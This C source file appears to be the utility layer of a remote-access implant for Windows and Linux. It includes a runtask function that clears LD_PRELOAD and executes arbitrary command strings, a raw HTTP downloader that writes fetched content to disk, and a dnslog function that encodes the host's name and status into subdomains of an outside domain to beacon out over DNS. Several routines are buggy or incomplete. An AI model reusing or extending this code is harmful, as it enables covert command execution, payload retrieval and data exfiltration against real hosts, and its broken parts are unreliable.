#include "utils.h"

char ME[100]; //This is where the hostname will be stored

bool file_exists(char *filename)
{
    struct stat buffer;
    return (stat(filename, &buffer) == 0);
}

char *getmyhostname()
{
    return ME;
}



void setmyhostname()
{
    char inbuff[1024];
    FILE *fh;

    // open the file in temp first
    char path[1024];
    
    makepath(path, 1024, "X9999-host");
    if (file_exists(path))
    { // Connect to socket and write to file
        fh = fopen(path, "r");

        if (fh == NULL)
        {
#ifdef TESTING
            printf("Failed to open the hostname file %s\n",path);
#endif
        }
        else
        {
#ifdef TESTING
            printf("hostname File opened ok.  Reading\n");
#endif

            fgets(inbuff, sizeof(inbuff), fh);
            if (inbuff[strlen(inbuff) - 1] == '\n')
            {
                inbuff[strlen(inbuff) - 1] = '\0';
            }

            fclose(fh);
#ifdef TESTING
            printf("Parsed Hostname :%s:\n", inbuff);
#endif
            strncpy(ME, inbuff, 99);
            return;
        }
    }
#ifdef TESTING
    printf("Didn't get it from X9999-host file at %s\n", path);
#endif
    // if not possible check environment variable
    //  on windows set varname=value
    char *temp = getenv("HOSTNAME");
    if (temp != NULL)
    {
#ifdef TESTING
        printf("Environment var hostname:%s:\n", temp);
#endif
        strncpy(ME, temp, 99);
        return;
    }
#ifdef TESTING
    printf("Didn't get it from environment\n");
#endif
    // if not there use localhostname.
    if (gethostname(inbuff, 1024) == 0)
    { // Brilliant 0 is success on this one :(

        strncpy(ME, inbuff, 99);

#ifdef TESTING
        printf("Defaulting to own hostname :%s:\n", inbuff);
#endif
        return;
    }

    printf("Didn't get it from localhostname\n");
    sprintf(ME, "dunno"); // Unsafe but good enough
}

/* Runtask For Windows
void runtask(char *task) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    char *cmd = "c:\\Windows\\notepad.exe";
    CreateProcessA(NULL, task, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi );
}
*/


/* Runtask for Linux */
void runtask(char *task)
{
#ifdef LINUX_VERSION
    unsetenv("LD_PRELOAD");
    system(task);
#endif
#ifdef WINDOWS_VERSION
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    char *cmd = "c:\\Windows\\notepad.exe";
    CreateProcessA(NULL, task, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi );
#endif
}



void makepath(char* dest, int destlen, char* back) {

#ifdef LINUX_VERSION
  char localpath[1024] = "/tmp/";
#endif

#ifdef WINDOWS_VERSION
  // dont know if this works yet.
  char localpath[1024] = "C:\\TEMP\\";
#endif

  _snprintf(dest, destlen, "%s%s", localpath, back);

}


int get_content_length(char *response)
{
    char *start, *end;
    char content_len_str[100]; // content length won't be longer than 100 characters
    int len;

    start = strstr(response, "Content-Length: ");
    if (start == NULL)
    {
        return -1;
    }
    start += 16;
    end = start;
    while (*end && isdigit(*end))
    {
        end++;
    }
    len = end - start;
    strncpy(content_len_str, start, len);

    content_len_str[len] = '\0';
#ifdef TESTING
    printf("Content-Length: %s\n", content_len_str);
#endif

    return atoi(content_len_str);
}

void base64encode(char *in, char *out)
{
    const char base64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t len = strlen(in);
    //char* output = malloc((len*4/3 + 4) * sizeof(char)); // allocate enough space for the encoded string
    //if (!output) {
    //    return NULL; // failed to allocate memory
    //}
    size_t i, j;
    size_t finallen = 0;
    for (i = 0, j = 0; i < len; i += 3, j += 4) {
        int buf = ((int) in[i]) << 16;
        if (i + 1 < len) buf |= ((int)in[i+1]) << 8;
        if (i + 2 < len) buf |= ((int)in[i+2]);
        out[j] = base64chars[(buf >> 18) & 0x3F];
        out[j+1] = base64chars[(buf >> 12) & 0x3F];
        out[j+2] = (i + 1 < len) ? base64chars[(buf >> 6) & 0x3F] : '=';
        out[j+3] = (i + 2 < len) ? base64chars[buf & 0x3F] : '=';
        out[j+4] = '\0';
    }

    //How do I null terminate it?
}

void base64decode(char *in, char *out)
{
    const char base64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    size_t len = strlen(in);
    if (len % 4 != 0) {
        return; // invalid input string length
    }
    size_t padding = 0;
    if (len > 0 && in[len-1] == '=') padding++;
    if (len > 1 && in[len-2] == '=') padding++;
    size_t out_len = len*3/4 - padding;
    //char* output = malloc((out_len+1) * sizeof(char)); // allocate enough space for the decoded string
    //if (!output) {
    //    return NULL; // failed to allocate memory
    //}
    size_t i, j;
    for (i = 0, j = 0; i < len; i += 4, j += 3) {
        int buf = 0;
        size_t k;
        for (k = 0; k < 4; k++) {
            buf <<= 6;
            if (in[i+k] >= 'A' && in[i+k] <= 'Z') buf |= in[i+k] - 'A';
            else if (in[i+k] >= 'a' && in[i+k] <= 'z') buf |= in[i+k] - 'a' + 26;
            else if (in[i+k] >= '0' && in[i+k] <= '9') buf |= in[i+k] - '0' + 52;
            else if (in[i+k] == '+') buf |= 62;
            else if (in[i+k] == '/') buf |= 63;
            else return; // invalid character in input string
        }
        out[j] = (buf >> 16) & 0xFF;
        if (k >= 2) out[j+1] = (buf >> 8) & 0xFF;
        if (k >= 3) out[j+2] = buf & 0xFF;
    }
    out[out_len] = '\0'; // null-terminate the output string
}

void webrequest(char* ip, int port, char* torequest, char* outpath) {

#ifdef WINDOWS_VERSION
    char portstring[10]; 

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    int iResult;
    int recvbuflen = 1024;
    char request[1300];
    char inbuff[1024];
    FILE* fh;

    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;

    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port (Why PORT IN getaddrinfo... dumb)
    snprintf(portstring, 10, "%d", port);
    iResult = getaddrinfo(ip, portstring, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return;
    }
    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        sock = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (sock == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return;
        }

        // Connect to server.
        iResult = connect( sock, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }
        break;
    }
    
    freeaddrinfo(result);

    if (iResult < 0)
    {
#ifdef TESTING
        printf("Socket Error\n");
#endif
        closesocket(sock);
    }
    else
    {
        // Send request
        _snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", torequest, ME);
        iResult = send(sock, request, strlen(request), 0);

        Sleep(1);
        int tmp = recv(sock, inbuff, sizeof(inbuff), 0); // probably have the full header portion here.

        // Find the Content-Length
        int toread = get_content_length(inbuff);
        if (toread == -1)
        {
#ifdef TESTING
            printf("didn't find content-length\n");
#endif
            closesocket(sock);
            return;
        }

        unlink(outpath); // Delete if already exists
        fh = fopen(outpath, "w");

        int sofar = 0;

        char *start = strstr(inbuff, "\r\n\r\n");
        if (start == NULL)
        {
#ifdef TESTING
            printf("Couldn't find the boundary between response and body\n");
#endif
            return;
        }
        start += 4; // Get past the \r\n\r\n
        int len_of_header = (unsigned long int)start - (unsigned long int)inbuff;

        int tmp2 = fwrite(start, sizeof(char), tmp - len_of_header, fh);
#ifdef TESTING
        printf("Wrote %d bytes\n", tmp2);
#endif
        sofar = tmp2;

        while (sofar < toread)
        {
            Sleep(1); // This may be too long for effective comms.
            tmp = recv(sock, inbuff, sizeof(inbuff), 0);
#ifdef TESTING
            printf("Received %d bytes\n", tmp);
#endif
        sofar += tmp;

        if (tmp > 0)
        {
            tmp2 = fwrite(inbuff, sizeof(char), tmp, fh);
#ifdef TESTING
            printf("Wrote %d bytes\n", tmp2);
#endif
        }
    }
#ifdef TESTING
    printf("Done writing, closing file");
#endif
    fclose(fh);
    closesocket(sock);
    WSACleanup();
}
#endif

#ifdef LINUX_VERSION
    int sockfd;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
        {
#ifdef TESTING
            printf("Error opening socket\n");
#endif
        }
        // bzero(&servaddr, sizeof(servaddr));  //Commented but may need it.
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = inet_addr(ip);
        servaddr.sin_port = htons(port);

        int tmp = connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

        if (tmp < 0)
        {
#ifdef TESTING
            printf("Socket Error\n");
#endif
            close(sockfd);
        }
        else
        {
        // Send request
            _snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", torequest, ME);
            send(sockfd, request, strlen(request), 0);

            sleep(1);
            int tmp = recv(sockfd, inbuff, sizeof(inbuff), 0); // probably have the full header portion here.

            // Find the Content-Length
            int toread = get_content_length(inbuff);
            if (toread == -1)
            {
#ifdef TESTING
                printf("didn't find content-length\n");
#endif
            }

            unlink(outpath); // Delete if already exists
            fh = fopen(outpath, "w");

            int sofar = 0;

            char *start = strstr(inbuff, "\r\n\r\n");
            if (start == NULL)
            {
#ifdef TESTING
                printf("Couldn't find the boundary between response and body\n");
#endif
            }
            start += 4; // Get past the \r\n\r\n
            int len_of_header = (unsigned long int)start - (unsigned long int)inbuff;

            int tmp2 = fwrite(start, sizeof(char), tmp - len_of_header, fh);
#ifdef TESTING
            printf("Wrote %d bytes\n", tmp2);
#endif
            sofar = tmp2;

            while (sofar < toread)
            {
                sleep(1); // This may be too long for effective comms.
                tmp = recv(sockfd, inbuff, sizeof(inbuff), 0);
#ifdef TESTING
                printf("Received %d bytes\n", tmp);
#endif
                sofar += tmp;

                if (tmp > 0)
                {
                    tmp2 = fwrite(inbuff, sizeof(char), tmp, fh);
#ifdef TESTING
                    printf("Wrote %d bytes\n", tmp2);
#endif
                }
            }
#ifdef TESTING
            printf("Done writing, closing file");
#endif
            fclose(fh);
        }
#endif
}

void dnslog(char* status)
{
    char tmp[256];
    char tmp2[256];
    int tmp2len=256;
    snprintf(tmp, 256, "%s - %s", ME, status);
    originalb58encode(tmp, strlen(tmp), tmp2, &tmp2len);

    snprintf(tmp, 256, "%s.logger.multifariousnonsense.com", tmp2);
#ifdef WINDOWS_VERSION
    DNS_RECORD *dns_records;
#ifdef TESTING
    printf("sending log message of: %s", tmp);
#endif
    DnsQuery_A(tmp, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &dns_records, NULL);

    DnsRecordListFree(dns_records, DnsFreeRecordList);
#endif
#ifdef LINUX_VERSION
    struct hostent *hp = gethostbyname(tmp);
    //Suspect there's a memory leak here.  Need to free hp but not sure if simple free will do it.
#endif
}

//Chat GPT Prompt: I need a C function for base58 encoding a string called in.  The result should be in out and be null terminated
//Changed it to void type and killed return values.

void base58encode(const char* in, const int in_len, char* out, int* out_len) {
    printf("base58encode inbound length: %d\n", in_len);
    const char* const BASE58_CHARS = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    

    int i, j, carry, idx, start, stop;
    int x;

    if (out_len == NULL) {
        return;
    }

    // Count leading zeros
    for (start = 0; start < in_len && in[start] == '\0'; start++);
    // Count trailing zeros
    for (stop = in_len - 1; stop > 0 && in[stop] == '\0'; stop--);

    printf("in is %s\n", in);
    printf("inlen is %d\n",in_len);
    printf("leading zeros: %d\n", start);
    printf("trailing zeros: %d\n", stop);
    // Allocate enough space in output buffer
    int zero_count = 0;
    for (i = start; i <= stop; i++) {
        if (in[i] == '\0') {
            zero_count++;
        }
    }

    printf ("Zerocount is: %d\n", zero_count);

    int out_size = ((stop - start + 1) * 138 / 100) + 1; // log(256) / log(58) + 1
    out_size += zero_count;

    printf("out_size is %d\n",out_size);
    printf("out_len is %d\n", *out_len);
    if (*out_len < out_size) {
        *out_len = out_size;
        return;
    }
    *out_len = out_size;


    memset(out, BASE58_CHARS[0], out_size);
    printf("after memset\n");

    // Convert input to base-58
    for (i = start, j = out_size - 2; i <= stop; i++) {
        printf("i is now: %d\n", i);
        carry = in[i];
        idx = out_size - 2;
        while (carry || idx > j) {
            x = (int)out[idx];
            x = x * 256 + carry;
            carry = x / 58;
            out[idx] = BASE58_CHARS[x % 58];
            idx--;
        }
        j = idx;
    }
    
    printf ("AFter convert\n");
    // Add leading '1's
    for (i = 0; i < start; i++) {
        out[j--] = BASE58_CHARS[0];
    }

    out[out_size - 1] = '\0';

    printf("OUT is :%s:\nlength: %d", out,out_size-1);
    return;
}

void originalb58encode (const char* in, const unsigned int in_len, char* out, unsigned int* out_len) {
    unsigned int i, j, carry, idx, start, stop;
    unsigned int x;
    const char* const BASE58_CHARS = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";


    if (out_len == NULL) {
        return;
    }

    // Count leading zeros
    for (start = 0; start < in_len && in[start] == 0; start++);
    // Count trailing zeros
    for (stop = in_len - 1; stop > 0 && in[stop] == 0; stop--);

    // Allocate enough space in output buffer
    unsigned int zero_count = 0;
    for (i = start; i <= stop; i++) {
        if (in[i] == 0) {
            zero_count++;
        }
    }
    unsigned int out_size = ((stop - start + 1) * 138 / 100) + 1; // log(256) / log(58) + 1
    out_size += zero_count;

    if (*out_len < out_size) {
        *out_len = out_size;
        return;
    }
    *out_len = out_size;

    memset(out, BASE58_CHARS[0], out_size);
    printf("After memset\n");

    // Convert input to base-58
    for (i = start, j = out_size - 2; i <= stop; i++) {
        carry = in[i];
        idx = out_size - 2;
        while (carry || idx > j) {
            x = (unsigned int)out[idx];
            x = x * 256 + carry;
            carry = x / 58;
            out[idx] = BASE58_CHARS[x % 58];
            idx--;
            printf ("loop\n");
        }
        j = idx;
    }
    
    // Add leading '1's
    for (i = 0; i < start; i++) {
        out[j--] = BASE58_CHARS[0];
    }
    
 
    out[out_size - 1] = '\0';
    printf("out is: %s", out);
    return;
}

void base58decode(const char *encoded_value, char *out, int out_size) {
    
    static const char *BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    // Initialize output buffer to 0
    memset(out, 0, out_size);

    // Decode the Base58-encoded string
    int encoded_len = strlen(encoded_value);
    int num = 0;
    for (int i = 0; i < encoded_len; i++) {
        char c = encoded_value[i];
        const char *pos = strchr(BASE58_ALPHABET, c);
        if (pos == NULL) {
            return; // Invalid character
        }
        size_t idx = pos - BASE58_ALPHABET;
        num = num * 58 + idx;
    }

    // Convert the decoded number to bytes
    int i = out_size;
    while (i-- > 0 && num > 0) {
        out[i] = num & 0xFF;
        num >>= 8;
    }

    // Null-terminate the output buffer
    if (i < out_size - 1) {
        out[i+1] = '\0';
        return;
    } else {
        return; // Output buffer too small
    }
}